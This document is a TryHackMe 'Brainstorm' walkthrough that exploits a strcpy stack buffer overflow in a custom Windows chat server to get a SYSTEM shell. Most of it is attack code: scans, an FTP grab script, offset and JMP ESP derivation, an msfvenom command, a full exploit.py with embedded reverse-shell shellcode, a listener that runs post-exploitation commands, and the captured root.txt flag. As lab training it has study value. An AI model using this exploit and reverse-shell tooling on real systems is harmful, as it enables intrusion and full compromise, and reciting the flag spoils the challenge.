# TryHackMe — Brainstorm: Reverse-Engineering a Chat Server → Buffer Overflow RCE

> ## ⚙️ Before you run — variables to change
>
> This guide uses the exact values from one live run. On a fresh TryHackMe session the two
> IPs change (you get a new VPN IP and the box gets a new IP), so update these first:
>
> | Variable | Used in | This run's value | How to get yours |
> |----------|---------|------------------|------------------|
> | **TARGET IP** | nmap, FTP, `exploit.py` | `10.48.159.173` | the IP on your THM room page |
> | **LHOST** (your tun0 IP) | `msfvenom`, `handler.py` | `192.168.137.46` | `ip -4 addr show tun0 \| grep -oP 'inet \K[0-9.]+'` |
> | **LPORT** (listener port) | `msfvenom`, `handler.py`, `nc` | `4444` | any free port (keep all three in sync) |
>
> After changing LHOST/LPORT you **must regenerate the shellcode** with `msfvenom` (see §6)
> and paste the new bytes into `exploit.py` — the old shellcode has the old IP/port baked in.
>
> **Intrinsic to the binary — do NOT change** (these came from reverse engineering and stay
> constant for this box): EIP **offset = 2012**, **`JMP ESP = 0x625014df`** (in `essfunc.dll`),
> bad chars **`\x00\x0a\x0d`**, and the protocol flow (send username first, then the overflow
> message).

## 1. Enumeration — port scan

ICMP is blocked, so use `-Pn`. A full-port scan at a sane rate (high `--min-rate` can drop
the single-probe custom port, so re-check 9999 explicitly):

```bash
nmap -Pn -p- --min-rate 1000 -oN nmap_allports.txt 10.48.159.173     # full sweep
nmap -Pn -p 21,3389,9999 -sV 10.48.159.173                           # service detail
```

**Result — 3 open ports:**

| Port | Service | Notes |
|------|---------|-------|
| 21   | `Microsoft ftpd` | anonymous login allowed |
| 3389 | `ms-wbt-server` (RDP) | |
| 9999 | **Brainstorm chat (beta)** | custom service — the "strange port" |

The 9999 banner gives away the app:
```
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters):
```

> **Q1. How many ports are open? → `3`**

---

## 2. Enumerating FTP & grabbing the files

The passive-mode data ports are firewalled, so force **active mode** (server connects back
to your tun0 IP). Anonymous creds, then recurse into the `chatserver` directory:

```python
# ftp_pull.py
import ftplib
f = ftplib.FTP(); f.connect("10.48.159.173", 21, timeout=30)
f.login("anonymous", "anonymous@x")
f.set_pasv(False)                       # ACTIVE mode (passive is filtered)
f.cwd("/chatserver")
for name in ("chatserver.exe", "essfunc.dll"):
    with open(name, "wb") as fh:
        f.retrbinary("RETR " + name, fh.write)
    print("downloaded", name)
f.quit()
```

```
/chatserver/chatserver.exe   43747 bytes
/chatserver/essfunc.dll      30761 bytes
```

> **Q2. Name of the exe file → `chatserver.exe`**
> (shipped next to its helper library `essfunc.dll`)

The service on 9999 is literally this binary, and we now have it **plus** its DLL for local
analysis — exactly what the task hints at.

---

## 3. Reverse engineering `chatserver.exe`

Open the binary and locate the function that prints `"Write a message: "` — that's the
message handler. It lives in `_ConnectionHandler@4` (`0x40199e`). The handler logic:

1. 1st client input = **username** → `strncat`'d (max 21 bytes) into a small stack buffer.
2. 2nd client input = **message** → `recv`'d into a 4096-byte heap buffer, then passed to
   `_Overflow()`.

Decompiling `_Overflow`:

```c
void __cdecl _Overflow(char *param_1)
{
    char local_7dc [2008];        // 2008-byte stack buffer
    strcpy(local_7dc, param_1);   // <-- unbounded copy = stack buffer overflow
    return;
}
```

`strcpy` copies the attacker-controlled message (up to ~4096 bytes) into a **2008-byte**
stack buffer with no length check → classic stack smash. The chat protocol requires us to
send a **username first**, then the oversized **message** to trigger it.

> **Q(desc). Read the description — understood: overflow in the message field via `strcpy`.**

---

## 4. Finding the EIP offset

Stack frame of `_Overflow`:

```
[ 2008-byte buffer ][ 4-byte saved EBP ][ 4-byte saved EIP ]
 \___ 2008 ________/\___ 4 ___________/
 \_________ 2012 bytes to reach saved EIP _______________/
```

**EIP offset = 2012.** You confirm this the normal way with a cyclic pattern against a
local copy of `chatserver.exe` running under a debugger (Immunity/x32dbg + mona):

```bash
# generate a unique pattern
msf-pattern_create -l 3000        # send as the message, watch EIP in the debugger
# EIP = 31704330  ->
msf-pattern_offset -l 3000 -q 31704330   # -> Exact match at offset 2012
```

Our static analysis of the buffer layout (2008 + 4) matches the dynamic result.

> **Q2(expl). EIP offset → `2012`**

---

## 5. Defeating ASLR/DEP — the `JMP ESP` in `essfunc.dll`

After 2012 bytes we control EIP. We can't hardcode a stack address (would vary), so we need
a `JMP ESP` trampoline at a **fixed, reliable** address. Check which module lacks
protections — `essfunc.dll`:

```python
# check PE DllCharacteristics
import struct
d = open("essfunc.dll","rb").read()
opt = struct.unpack_from("<I", d, 0x3c)[0] + 24
print("ImageBase        = %#x" % struct.unpack_from("<I", d, opt+0x1c))
print("DllCharacteristics= %#06x" % struct.unpack_from("<H", d, opt+0x46))
# ImageBase = 0x62500000 , DllCharacteristics = 0x0000  -> NO ASLR, NO DEP
```

`DllCharacteristics = 0x0000` → no ASLR (fixed base `0x62500000`) and no DEP → stack is
executable and the module never moves. Now find a `JMP ESP` (`FF E4`) inside it:

```bash
# with mona in the debugger:  !mona jmp -r esp -m essfunc.dll
# or statically search for the FF E4 opcode:
```
Several exist; we use **`0x625014df`** → bytes `df 14 50 62` (little-endian, **no null
bytes**, so `strcpy` won't truncate our address).

> **Q3(expl). Function/module without ASLR-DEP → `essfunc.dll`, `JMP ESP @ 0x625014df`**

**Bad characters:** because the copy is `strcpy`, `\x00` terminates it → it's a bad char.
We also exclude `\x0a \x0d` to be safe.

---

## 6. Generating shellcode (msfvenom)

Reverse shell back to your listener, excluding bad chars, `EXITFUNC=thread` so the crashing
thread dies cleanly and the service stays up:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.137.46 LPORT=4444 \
         EXITFUNC=thread -b '\x00\x0a\x0d' -f python -v shellcode
```

Paste the emitted `shellcode = b"..."` into the exploit below.

> **Q4(expl). Generate shellcode with msfvenom — done above.**

---

## 7. The exploit script

```python
#!/usr/bin/env python3
# exploit.py  — THM Brainstorm chatserver.exe (9999) stack BOF
import socket, sys, struct, time

target = sys.argv[1] if len(sys.argv) > 1 else "10.48.159.173"
port   = 9999

OFFSET  = 2012
JMP_ESP = struct.pack("<I", 0x625014df)   # JMP ESP in essfunc.dll (no ASLR)
NOPS    = b"\x90" * 16                     # NOP sled before shellcode

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.137.46 LPORT=4444 \
#          EXITFUNC=thread -b '\x00\x0a\x0d' -f python -v shellcode
shellcode =  b""
shellcode += b"..."                        # <-- paste msfvenom output here

buf = b"A"*OFFSET + JMP_ESP + NOPS + shellcode

s = socket.socket(); s.connect((target, port))
s.recv(1024)                               # welcome + username prompt
s.send(b"pwn\n"); time.sleep(0.5)          # 1) username (1st input)
s.recv(1024)                               # "Write a message:"
s.send(buf + b"\n")                        # 2) message -> _Overflow -> strcpy -> RCE
print("[*] payload sent — check your listener")
s.close()
```

Run it with a listener ready:

```bash
# terminal 1
nc -lvnp 4444
# terminal 2
python3 exploit.py 10.48.159.173
```

---

## 8. Shell → read the flag  ✅ VERIFIED

The reverse shell connected back to the listener and returned a **SYSTEM** shell
(the service runs as `nt authority\system`):

```
[+] Shell from 10.48.159.173:49444
Microsoft Windows [Version 6.1.7601]

C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> hostname
brainstorm
C:\Windows\system32> type C:\Users\drake\Desktop\root.txt
5b1001de5a44eca47eee71e7942a8f8a
```

> **Q5(expl). Content of `root.txt` → `5b1001de5a44eca47eee71e7942a8f8a`**
> (and we landed as `NT AUTHORITY\SYSTEM`, not just `drake`).

---

## Why it works (one paragraph)
The chat server copies the client's "message" into a fixed 2008-byte stack buffer with
`strcpy` and no bounds check. Sending 2012 bytes overwrites the saved return address; the
next 4 bytes set EIP to a `JMP ESP` inside `essfunc.dll`, a sibling module compiled with no
ASLR and no DEP (`DllCharacteristics=0x0000`), so its base `0x62500000` is constant and the
stack is executable. `JMP ESP` lands execution on our NOP sled + shellcode sitting
immediately after the overwritten return address, giving a shell that returned as `NT AUTHORITY\SYSTEM`.

---

# Appendix A — Complete scripts (verbatim, reproducible)

### `ftp_pull.py` — grab the binaries over anonymous FTP (active mode)
```python
import ftplib
f = ftplib.FTP(); f.connect("10.48.159.173", 21, timeout=30)
f.login("anonymous", "anonymous@x")
f.set_pasv(False)                       # ACTIVE mode (passive data ports are filtered)
f.cwd("/chatserver")
for name in ("chatserver.exe", "essfunc.dll"):
    with open(name, "wb") as fh:
        f.retrbinary("RETR " + name, fh.write)
    print("downloaded", name)
f.quit()
```

### `exploit.py` — final working exploit (with embedded msfvenom shellcode)
```python
#!/usr/bin/env python3
# THM Brainstorm - chatserver.exe (port 9999) stack buffer overflow exploit
#
# Vulnerability (from RE of chatserver.exe):
#   _Overflow(char *param_1) { char local_7dc[2008]; strcpy(local_7dc, param_1); }
#   The 2nd client input ("message") is strcpy'd into a 2008-byte stack buffer.
#
# EIP offset = 2012  (2008-byte buffer + 4-byte saved EBP)
# JMP ESP    = 0x625014df  in essfunc.dll (DllCharacteristics=0x0000 -> no ASLR/DEP)
#
# Shellcode: windows/shell_reverse_tcp LHOST=192.168.137.46 LPORT=4444
#            EXITFUNC=thread -b '\x00\x0a\x0d'
#
# Usage: python3 exploit.py [target_ip] [port]
import socket, sys, struct, time

target = sys.argv[1] if len(sys.argv) > 1 else "10.48.159.173"
port   = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

OFFSET  = 2012
JMP_ESP = struct.pack("<I", 0x625014df)   # df 14 50 62  (no null bytes)
NOPS    = b"\x90" * 16

shellcode =  b""
shellcode += b"\xbb\xb5\x1d\xb1\x1b\xdb\xdc\xd9\x74\x24\xf4"
shellcode += b"\x58\x31\xc9\xb1\x52\x31\x58\x12\x03\x58\x12"
shellcode += b"\x83\x75\x19\x53\xee\x89\xca\x11\x11\x71\x0b"
shellcode += b"\x76\x9b\x94\x3a\xb6\xff\xdd\x6d\x06\x8b\xb3"
shellcode += b"\x81\xed\xd9\x27\x11\x83\xf5\x48\x92\x2e\x20"
shellcode += b"\x67\x23\x02\x10\xe6\xa7\x59\x45\xc8\x96\x91"
shellcode += b"\x98\x09\xde\xcc\x51\x5b\xb7\x9b\xc4\x4b\xbc"
shellcode += b"\xd6\xd4\xe0\x8e\xf7\x5c\x15\x46\xf9\x4d\x88"
shellcode += b"\xdc\xa0\x4d\x2b\x30\xd9\xc7\x33\x55\xe4\x9e"
shellcode += b"\xc8\xad\x92\x20\x18\xfc\x5b\x8e\x65\x30\xae"
shellcode += b"\xce\xa2\xf7\x51\xa5\xda\x0b\xef\xbe\x19\x71"
shellcode += b"\x2b\x4a\xb9\xd1\xb8\xec\x65\xe3\x6d\x6a\xee"
shellcode += b"\xef\xda\xf8\xa8\xf3\xdd\x2d\xc3\x08\x55\xd0"
shellcode += b"\x03\x99\x2d\xf7\x87\xc1\xf6\x96\x9e\xaf\x59"
shellcode += b"\xa6\xc0\x0f\x05\x02\x8b\xa2\x52\x3f\xd6\xaa"
shellcode += b"\x97\x72\xe8\x2a\xb0\x05\x9b\x18\x1f\xbe\x33"
shellcode += b"\x11\xe8\x18\xc4\x56\xc3\xdd\x5a\xa9\xec\x1d"
shellcode += b"\x73\x6e\xb8\x4d\xeb\x47\xc1\x05\xeb\x68\x14"
shellcode += b"\x89\xbb\xc6\xc7\x6a\x6b\xa7\xb7\x02\x61\x28"
shellcode += b"\xe7\x33\x8a\xe2\x80\xde\x71\x65\x6f\xb6\xf0"
shellcode += b"\x5b\x07\xc5\x02\xb5\x8b\x40\xe4\xdf\x23\x05"
shellcode += b"\xbf\x77\xdd\x0c\x4b\xe9\x22\x9b\x36\x29\xa8"
shellcode += b"\x28\xc7\xe4\x59\x44\xdb\x91\xa9\x13\x81\x34"
shellcode += b"\xb5\x89\xad\xdb\x24\x56\x2d\x95\x54\xc1\x7a"
shellcode += b"\xf2\xab\x18\xee\xee\x92\xb2\x0c\xf3\x43\xfc"
shellcode += b"\x94\x28\xb0\x03\x15\xbc\x8c\x27\x05\x78\x0c"
shellcode += b"\x6c\x71\xd4\x5b\x3a\x2f\x92\x35\x8c\x99\x4c"
shellcode += b"\xe9\x46\x4d\x08\xc1\x58\x0b\x15\x0c\x2f\xf3"
shellcode += b"\xa4\xf9\x76\x0c\x08\x6e\x7f\x75\x74\x0e\x80"
shellcode += b"\xac\x3c\x55\xa5\x7f\xb3\x02\xfc\xea\x8e\x4e"
shellcode += b"\xff\xc1\xcd\x76\x7c\xe3\xad\x8c\x9c\x86\xa8"
shellcode += b"\xc9\x1a\x7b\xc1\x42\xcf\x7b\x76\x62\xda"

def recv_until(s, token=b":", t=10):
    s.settimeout(t)
    data = b""
    try:
        while token not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

def main():
    buf = b"A" * OFFSET + JMP_ESP + NOPS + shellcode
    print(f"[*] Target {target}:{port}  payload={len(buf)} bytes  offset={OFFSET}  jmpesp=0x625014df")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    print("[<]", recv_until(s).decode(errors="replace").strip())
    s.send(b"pwn\n")                 # 1) username (1st input)
    time.sleep(0.5)
    print("[<]", recv_until(s).decode(errors="replace").strip())
    s.send(buf + b"\n")              # 2) message -> _Overflow -> strcpy overflow -> RCE
    time.sleep(1)
    print("[*] Overflow payload sent. Check your listener on 4444.")
    try: s.close()
    except Exception: pass

if __name__ == "__main__":
    main()
```

### `handler.py` — reverse-shell listener + auto post-exploitation
```python
#!/usr/bin/env python3
# Reverse-shell handler: listens on 4444, catches the cmd.exe shell from the
# Brainstorm exploit, runs post-exploitation commands, prints everything.
import socket, select, sys, time

LPORT = 4444
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", LPORT))
srv.listen(1)
srv.settimeout(90)
print(f"[*] Listening on 0.0.0.0:{LPORT} ...", flush=True)

try:
    cli, addr = srv.accept()
except socket.timeout:
    print("[!] No connection within timeout.", flush=True)
    sys.exit(1)
print(f"[+] Shell from {addr[0]}:{addr[1]}", flush=True)

def drain(sock, wait=2.5):
    out = b""
    end = time.time() + wait
    while time.time() < end:
        r, _, _ = select.select([sock], [], [], 0.4)
        if r:
            d = sock.recv(65536)
            if not d:
                break
            out += d
            end = time.time() + wait
    return out.decode(errors="replace")

def run(sock, cmd):
    sock.send(cmd.encode() + b"\r\n")
    return drain(sock)

# initial banner (cmd.exe prompt)
print(drain(cli, 2.0), flush=True)

for cmd in [
    "whoami",
    "hostname",
    "ipconfig | findstr IPv4",
    "type C:\\Users\\drake\\Desktop\\root.txt",
    "where /r C:\\Users root.txt",
]:
    print(f"\n===== > {cmd} =====", flush=True)
    print(run(cli, cmd), flush=True)

print("\n[*] Post-exploitation batch complete.", flush=True)
cli.close()
```

### Shellcode generation (msfvenom)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.137.46 LPORT=4444 \
         EXITFUNC=thread -b '\x00\x0a\x0d' -f python -v shellcode
```

### Run it
```bash
# terminal 1 — listener (or use handler.py for automated capture)
nc -lvnp 4444
# terminal 2 — fire
python3 exploit.py 10.48.159.173 9999
```
